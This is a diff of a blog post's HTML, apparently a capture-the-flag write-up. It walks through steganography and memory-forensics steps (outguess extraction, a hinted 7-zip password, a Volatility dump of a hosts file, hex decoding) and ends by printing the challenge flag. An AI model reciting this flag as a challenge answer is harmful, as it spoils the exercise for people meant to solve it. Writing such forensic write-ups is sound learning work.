+</code></pre><p>Alright, so far so good. Next step was to download this image <code>http://coresecsystems.com/cs5/Coresec_logo1.png</code>, according to the HTML document.</p><h2 id=steganography>Steganography</h2><p>Running the <code>file</code> command informed me that it was a JPEG file even though the file extension was .png.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ file Coresec_logo1.png
-Coresec_logo1.png: JPEG image data, JFIF standard 1.01
-</code></pre></td></tr></table>
-</div>
-</div><p>So I ran <code>less Coresec_logo1.png</code> and scrolled down its contents, and there it was at the end, a reversed base64 encoded string.</p>
-<pre tabindex=0><code>==gLzNXZ1dGd19GIvRHI5NXYlBCdhhGdgMXag82ZlR3UgwGbhBCdv5GI0VnYu4iLk5WamBCZv92ZgwSYoFGS
-</code></pre><p>After reversing the string using some random online tool and decoding it I got the following.</p>
-<pre tabindex=0><code>Haha, good find...but not all Stego is that easy to outguess.
-</code></pre><p>I was a little bit puzzled during this step, I was not sure which path to take in order to find the flag. I thought this image must have an embedded message inserted with a public steganography tool. I searched google to find all possible tools, then I came across a tool called <em>OutGuess</em>. Coincidence? I think not. I installed the tool on my kali linux machine and ran the following command:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ file Coresec_logo1.png
+</span></span><span class=line><span class=cl>Coresec_logo1.png: JPEG image data, JFIF standard 1.01
+</span></span></code></pre></td></tr></table></div></div><p>So I ran <code>less Coresec_logo1.png</code> and scrolled down its contents, and there it was at the end, a reversed base64 encoded string.</p><pre tabindex=0><code>==gLzNXZ1dGd19GIvRHI5NXYlBCdhhGdgMXag82ZlR3UgwGbhBCdv5GI0VnYu4iLk5WamBCZv92ZgwSYoFGS
+</code></pre><p>After reversing the string using some random online tool and decoding it I got the following.</p><pre tabindex=0><code>Haha, good find...but not all Stego is that easy to outguess.
+</code></pre><p>I was a little bit puzzled during this step, I was not sure which path to take in order to find the flag. I thought this image must have an embedded message inserted with a public steganography tool. I searched google to find all possible tools, then I came across a tool called <em>OutGuess</em>. Coincidence? I think not. I installed the tool on my kali linux machine and ran the following command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
 </span><span class=lnt>7
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>root@kali:~/Desktop# outguess -r Coresec_logo1.jpg out.jpg
-Reading Coresec_logo1.jpg....
-Extracting usable bits:   <span class=m>9100</span> bits
-Steg retrieve: seed: 59, len: <span class=m>82</span>
-root@kali:~/Desktop# cat out.jpg 
-There is no place like: 127.0.0.1
-Rember this key thing in life, and use that. :<span class=o>)</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Wow, there we go. Next step was to investigate the next image found in the HTML file in the previous steps, <code>http://coresecsystems.com/cs5/Coresec_logo2.jpg</code>.</p>
-<p>As usual, I run the <code>file</code> command to identify the newly downloaded file.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@kali:~/Desktop# outguess -r Coresec_logo1.jpg out.jpg
+</span></span><span class=line><span class=cl>Reading Coresec_logo1.jpg....
+</span></span><span class=line><span class=cl>Extracting usable bits:   <span class=m>9100</span> bits
+</span></span><span class=line><span class=cl>Steg retrieve: seed: 59, len: <span class=m>82</span>
+</span></span><span class=line><span class=cl>root@kali:~/Desktop# cat out.jpg 
+</span></span><span class=line><span class=cl>There is no place like: 127.0.0.1
+</span></span><span class=line><span class=cl>Rember this key thing in life, and use that. :<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>Wow, there we go. Next step was to investigate the next image found in the HTML file in the previous steps, <code>http://coresecsystems.com/cs5/Coresec_logo2.jpg</code>.</p><p>As usual, I run the <code>file</code> command to identify the newly downloaded file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ file Coresec_logo2.jpg
-Coresec_logo2.jpg: 7-zip archive data, version 0.3
-</code></pre></td></tr></table>
-</div>
-</div><p>A 7-zip file, interesting. I change the file extention to .7z and used my local archive program to unpack the file. However I was asked to enter a password.</p>
-<p><img src=../images/Screen-Shot-2016-06-08-at-00-38-34.png alt=screenshot></p>
-<p>My first thought was to find some archive cracker, but then I remembered the message from the previous image <em>There is no place like: 127.0.0.1</em> and that I should remember this <strong>key</strong> thing in life. So I entered <code>127.0.0.1</code> as my password and voila, access granted!</p>
-<p>The unpacked file contained a regular <em>hosts</em> file usually found on unix systems, however the file was called <code>hosts.bak</code> which got me thinking that this is a backup file of the original file which has been updated with new information. If my theory was correct I had to go back to the <strong>.vmem</strong> file and extract the hosts file like I did with the <strong>.docm</strong> file.</p>
-<p>I consulted my filelist.txt which contained all the files present in the memory dump file and searched for <em>hosts</em>. Then I ran the following:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ file Coresec_logo2.jpg
+</span></span><span class=line><span class=cl>Coresec_logo2.jpg: 7-zip archive data, version 0.3
+</span></span></code></pre></td></tr></table></div></div><p>A 7-zip file, interesting. I change the file extention to .7z and used my local archive program to unpack the file. However I was asked to enter a password.</p><p><img src=../images/Screen-Shot-2016-06-08-at-00-38-34.png alt=screenshot></p><p>My first thought was to find some archive cracker, but then I remembered the message from the previous image <em>There is no place like: 127.0.0.1</em> and that I should remember this <strong>key</strong> thing in life. So I entered <code>127.0.0.1</code> as my password and voila, access granted!</p><p>The unpacked file contained a regular <em>hosts</em> file usually found on unix systems, however the file was called <code>hosts.bak</code> which got me thinking that this is a backup file of the original file which has been updated with new information. If my theory was correct I had to go back to the <strong>.vmem</strong> file and extract the hosts file like I did with the <strong>.docm</strong> file.</p><p>I consulted my filelist.txt which contained all the files present in the memory dump file and searched for <em>hosts</em>. Then I ran the following:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -625,46 +430,34 @@ Coresec_logo2.jpg: 7-zip archive data, version 0.3
 </span><span class=lnt>25
 </span><span class=lnt>26
 </span><span class=lnt>27
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile<span class=o>=</span>Win7SP0x64 dumpfiles -Q 0x000000003e1ab7b0 --name -D ./
-Volatility Foundation Volatility Framework 2.4
-DataSectionObject 0x3e1ab7b0   None   <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\d</span>rivers<span class=se>\e</span>tc<span class=se>\h</span>osts
-$ cat file.None.0xfffffa800da434c0.hosts.dat
-<span class=c1># Copyright (c) 1993-2009 Microsoft Corp.</span>
-<span class=c1>#</span>
-<span class=c1># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span>
-<span class=c1>#</span>
-<span class=c1># This file contains the mappings of IP addresses to host names. Each</span>
-<span class=c1># entry should be kept on an individual line. The IP address should</span>
-<span class=c1># be placed in the first column followed by the corresponding host name.</span>
-<span class=c1># The IP address and the host name should be separated by at least one</span>
-<span class=c1># space.</span>
-<span class=c1>#</span>
-<span class=c1># Additionally, comments (such as these) may be inserted on individual</span>
-<span class=c1># lines or following the machine name denoted by a &#39;#&#39; symbol.</span>
-<span class=c1>#</span>
-<span class=c1># For example:</span>
-<span class=c1>#</span>
-<span class=c1>#      102.54.94.97     rhino.acme.com          # source server</span>
-<span class=c1>#       38.25.63.10     x.acme.com              # x client host</span>
-
-<span class=c1># localhost name resolution is handled within DNS itself.</span>
-<span class=c1>#	127.0.0.1       localhost</span>
-<span class=c1>#	::1             localhost</span>
-
-<span class=c1># 433072337333637b353466334c795f336e34384c316e365f385535316e3335357d</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id=get-the-flag>Get the flag</h2>
-<p>Found a strange string at the end of the <em>hosts</em> file, I wondered what it could be. My first thought was that it was a hash, but it didn&rsquo;t really look like any hash I could recognize. I searched google to find some site that could perhaps identify the string but no joy. After some time just looking at the string I realized that there are only 0-9 and b-e which got me thinking that this is perhaps HEX characters.</p>
-<p>Using an online HEX to ASCII converter, <strong>I found the flag:</strong> <code>C0r3s3c{54f3Ly_3n48L1n6_8U51n355}</code></p>
-</article>
-</div><footer>
-</footer></main>
-<script src=/js/particles.min.js defer></script>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile<span class=o>=</span>Win7SP0x64 dumpfiles -Q 0x000000003e1ab7b0 --name -D ./
+</span></span><span class=line><span class=cl>Volatility Foundation Volatility Framework 2.4
+</span></span><span class=line><span class=cl>DataSectionObject 0x3e1ab7b0   None   <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\d</span>rivers<span class=se>\e</span>tc<span class=se>\h</span>osts
+</span></span><span class=line><span class=cl>$ cat file.None.0xfffffa800da434c0.hosts.dat
+</span></span><span class=line><span class=cl><span class=c1># Copyright (c) 1993-2009 Microsoft Corp.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># This file contains the mappings of IP addresses to host names. Each</span>
+</span></span><span class=line><span class=cl><span class=c1># entry should be kept on an individual line. The IP address should</span>
+</span></span><span class=line><span class=cl><span class=c1># be placed in the first column followed by the corresponding host name.</span>
+</span></span><span class=line><span class=cl><span class=c1># The IP address and the host name should be separated by at least one</span>
+</span></span><span class=line><span class=cl><span class=c1># space.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># Additionally, comments (such as these) may be inserted on individual</span>
+</span></span><span class=line><span class=cl><span class=c1># lines or following the machine name denoted by a &#39;#&#39; symbol.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># For example:</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#      102.54.94.97     rhino.acme.com          # source server</span>
+</span></span><span class=line><span class=cl><span class=c1>#       38.25.63.10     x.acme.com              # x client host</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># localhost name resolution is handled within DNS itself.</span>
+</span></span><span class=line><span class=cl><span class=c1>#	127.0.0.1       localhost</span>
+</span></span><span class=line><span class=cl><span class=c1>#	::1             localhost</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 433072337333637b353466334c795f336e34384c316e365f385535316e3335357d</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=get-the-flag>Get the flag</h2><p>Found a strange string at the end of the <em>hosts</em> file, I wondered what it could be. My first thought was that it was a hash, but it didn&rsquo;t really look like any hash I could recognize. I searched google to find some site that could perhaps identify the string but no joy. After some time just looking at the string I realized that there are only 0-9 and b-e which got me thinking that this is perhaps HEX characters.</p><p>Using an online HEX to ASCII converter, <strong>I found the flag:</strong> <code>C0r3s3c{54f3Ly_3n48L1n6_8U51n355}</code></p></article></div><footer></footer></main><script src=/js/particles.min.js defer></script>
 <script src=/js/particles.conf.js defer></script>
 <script src=/js/baffle.min.js async></script>
-<script src=/js/main.js defer async></script>
-</body>
-</html>
+<script src=/js/main.js defer async></script></body></html>
